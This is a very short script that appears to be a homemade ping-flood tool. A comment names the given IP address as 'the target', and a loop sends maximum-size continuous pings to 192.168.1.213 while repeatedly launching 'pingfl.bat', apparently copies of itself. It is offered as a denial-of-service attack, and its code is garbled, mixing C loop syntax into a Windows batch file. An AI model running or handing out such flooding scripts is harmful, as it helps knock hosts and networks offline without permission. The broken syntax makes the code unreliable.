::the ip address given will be the target
for(int i = 0; i < 10; i++) {
 ping -l 65535 -t 192.168.1.213
 start pingfl.bat
}